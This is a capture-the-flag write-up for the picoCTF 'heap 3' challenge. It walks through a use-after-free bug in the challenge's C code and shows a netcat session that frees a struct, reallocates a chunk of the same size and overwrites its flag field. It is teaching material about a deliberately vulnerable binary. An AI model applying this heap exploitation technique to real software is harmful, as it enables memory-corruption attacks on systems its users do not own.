# [Pwn] heap 3

## 💡 Challenge Description

> *This program mishandles memory. Can you exploit it to get the flag?*

## 🔒 ELF Properties

```
rydzze ~ ❯ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=3fa64145c4efbd5a267e0525f58e294fba23ad2f, for GNU/Linux 3.2.0, with debug_info, not stripped

rydzze ~ ❯ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   52 Symbols        No    0               2               chall
```

## ✨ Walkthrough

```c
void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
  // Call function in struct
}
```

For this challenge, we need to change the value of the `flag` variable inside `x` to `pico`, so that when we call the `check_win` function, it will print out the flag. With that in mind, let’s investigate the code block by block.

```c
// Create struct
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

int num_allocs;
object *x;
```

At first, the program defines a struct type named `object`, which contains four array variables. Hence, we can conclude that the size of the `object` struct is 35 bytes. After that, it will declare a pointer variable `x` that can point to a struct of type `object`.

```c
// Create a struct
void init() {

    printf("\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n");
    fflush(stdout);

    x = malloc(sizeof(object));
    strncpy(x->flag, "bico", 5);
}
```

Next, the program allocates memory for the pointer variable `x` with the size of the `object` struct, and then copies 5 bytes into the `flag` field, storing the value `bico`.

```c
void alloc_object() {
    printf("Size of object allocation: ");
    fflush(stdout);
    int size = 0;
    scanf("%d", &size);
    char* alloc = malloc(size);
    printf("Data for flag: ");
    fflush(stdout);
    scanf("%s", alloc);
}

void free_memory() {
    free(x);
}
```

Now, we are introduced to two new functions which are `alloc_object` and `free_memory`.

`alloc_object` allocates a user-specified amount of memory and then takes input to fill it, without checking whether the input size fits safely.

`free_memory` deallocates memory by freeing the space pointed to by `x`.

## 🛠 Exploit

The vulnerability is known as a **Use-After-Free (UAF)**. To obtain the flag, we need to:

1. Free the memory of `x`, making its chunk available for reuse.
2. Allocate a new object of the same size, which will likely be placed in the same memory location as the freed `x`.
3. Provide the input `pico`, so it overwrites the `flag` field inside `x`.

If we don’t free the memory, the new allocation will use a different memory location instead of reusing `x`’s memory.”

```
rydzze ~ ❯ nc tethys.picoctf.net 59127

freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 5

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 2
Size of object allocation: 35
Data for flag: AAAAAAAAAABBBBBBBBBBCCCCCCCCCCpico

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 3


x = pico


1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 4
YOU WIN!!11!!
picoCTF{REDACTED}
```